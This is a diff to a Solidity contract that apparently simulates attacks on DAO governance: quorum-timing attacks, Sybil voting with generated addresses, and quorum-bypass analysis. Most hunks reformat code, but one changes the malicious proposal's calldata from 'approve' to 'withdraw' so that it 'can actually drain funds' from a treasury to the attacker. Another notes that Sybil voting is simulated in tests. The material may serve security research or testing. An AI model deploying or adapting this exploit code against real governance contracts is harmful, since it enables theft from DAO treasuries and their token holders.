@@ -97,11 +97,7 @@ contract QuorumManipulation {
     // Constructor
     // ─────────────────────────────────────────────────────────────────────────
 
-    constructor(
-        address _governanceToken,
-        address _governor,
-        address _targetTreasury
-    ) {
+    constructor(address _governanceToken, address _governor, address _targetTreasury) {
         require(_governanceToken != address(0), "Invalid token");
         require(_governor != address(0), "Invalid governor");
         require(_targetTreasury != address(0), "Invalid treasury");
@@ -120,10 +116,10 @@ contract QuorumManipulation {
      * @param treasuryDrainAmount Amount to drain from treasury
      * @param estimatedParticipation Simulated participation rate in basis points
      */
-    function executeTimingAttack(
-        uint256 treasuryDrainAmount,
-        uint256 estimatedParticipation
-    ) external returns (uint256) {
+    function executeTimingAttack(uint256 treasuryDrainAmount, uint256 estimatedParticipation)
+        external
+        returns (uint256)
+    {
         require(treasuryDrainAmount > 0, "Invalid drain amount");
         require(estimatedParticipation <= 10000, "Invalid participation");
 
@@ -142,7 +138,8 @@ contract QuorumManipulation {
         values[0] = 0;
 
         bytes[] memory calldatas = new bytes[](1);
-        calldatas[0] = abi.encodeWithSignature("approve(address,uint256)", attacker, treasuryDrainAmount);
+        // Use a treasury withdrawal method so the proposal can actually drain funds
+        calldatas[0] = abi.encodeWithSignature("withdraw(address,uint256)", attacker, treasuryDrainAmount);
 
         string memory description = "PROPOSAL: Emergency Treasury Access - Low Participation Window";
 
@@ -169,11 +166,10 @@ contract QuorumManipulation {
      * @param tokenPerAccount Tokens to distribute to each fake account
      * @param treasuryDrainAmount Amount to drain from treasury
      */
-    function executeSybilAttack(
-        uint256 numberOfSybilAccounts,
-        uint256 tokenPerAccount,
-        uint256 treasuryDrainAmount
-    ) external returns (uint256 proposalId) {
+    function executeSybilAttack(uint256 numberOfSybilAccounts, uint256 tokenPerAccount, uint256 treasuryDrainAmount)
+        external
+        returns (uint256 proposalId)
+    {
         require(numberOfSybilAccounts > 0, "Must create at least 1 sybil account");
         require(numberOfSybilAccounts <= 1000, "Sybil limit to 1000 for safety");
 
@@ -200,15 +196,13 @@ contract QuorumManipulation {
         proposalId = IGovernor(governor).propose(targets, values, calldatas, description);
         maliciousProposalId = proposalId;
 
-        // Vote with all Sybil accounts
+        // Cast a vote from this contract.
+        // NOTE: True Sybil behavior (many distinct msg.senders) must be
+        // simulated in tests using vm.prank per account.
         uint256 successfulVotes = 0;
-        for (uint256 i = 0; i < sybilAccounts.length && i < 100; i++) {
-            // In simulation, we can directly call as each account
-            // In practice, we'd coordinate externally
-            try IGovernor(governor).castVote(proposalId, VOTE_FOR) {
-                successfulVotes++;
-            } catch {}
-        }
+        try IGovernor(governor).castVote(proposalId, VOTE_FOR) {
+            successfulVotes = 1;
+        } catch {}
 
         if (successfulVotes > 0) {
             attackSucceeded = true;
@@ -226,15 +220,11 @@ contract QuorumManipulation {
      * @param totalVotingPower Total voting power in the system
      * @param attackVotingPower The attacker's available voting power
      */
-    function analyzeQuorumBypass(
-        uint256 fixedQuorumBasisPoints,
-        uint256 totalVotingPower,
-        uint256 attackVotingPower
-    ) external pure returns (
-        uint256 requiredQuorum,
-        bool canBypassQuorum,
-        uint256 minimumParticipation
-    ) {
+    function analyzeQuorumBypass(uint256 fixedQuorumBasisPoints, uint256 totalVotingPower, uint256 attackVotingPower)
+        external
+        pure
+        returns (uint256 requiredQuorum, bool canBypassQuorum, uint256 minimumParticipation)
+    {
         require(totalVotingPower > 0, "Invalid total voting power");
         require(fixedQuorumBasisPoints <= 10000, "Invalid quorum");
 
@@ -267,11 +257,7 @@ contract QuorumManipulation {
         for (uint256 i = 0; i < count; i++) {
             // In a real scenario, these would be actual addresses
             // For simulation, we create pseudo-addresses
-            address sybilAddr = address(
-                uint160(
-                    uint256(keccak256(abi.encodePacked(block.timestamp, msg.sender, i)))
-                )
-            );
+            address sybilAddr = address(uint160(uint256(keccak256(abi.encodePacked(block.timestamp, msg.sender, i)))));
 
             if (!isSybilAccount[sybilAddr]) {
                 sybilAccounts.push(sybilAddr);
@@ -305,10 +291,11 @@ contract QuorumManipulation {
      * @param quorumRequirement Quorum requirement (basis points)
      * @return vulnerabilityScore Score from 0-10000 indicating vulnerability
      */
-    function calculateVulnerabilityScore(
-        uint256 participationRate,
-        uint256 quorumRequirement
-    ) external pure returns (uint256 vulnerabilityScore) {
+    function calculateVulnerabilityScore(uint256 participationRate, uint256 quorumRequirement)
+        external
+        pure
+        returns (uint256 vulnerabilityScore)
+    {
         if (quorumRequirement == 0) return 10000; // Completely vulnerable
 
         if (participationRate < quorumRequirement) {
@@ -329,10 +316,11 @@ contract QuorumManipulation {
      * @param fixedQuorumBasisPoints Fixed quorum in basis points
      * @param calculatedParticipation Actual participation in basis points
      */
-    function getParticipationDiscountEffect(
-        uint256 fixedQuorumBasisPoints,
-        uint256 calculatedParticipation
-    ) external pure returns (uint256 voteEfficiency) {
+    function getParticipationDiscountEffect(uint256 fixedQuorumBasisPoints, uint256 calculatedParticipation)
+        external
+        pure
+        returns (uint256 voteEfficiency)
+    {
         if (calculatedParticipation == 0) return 0;
 
         // Vote efficiency = required quorum / actual participation
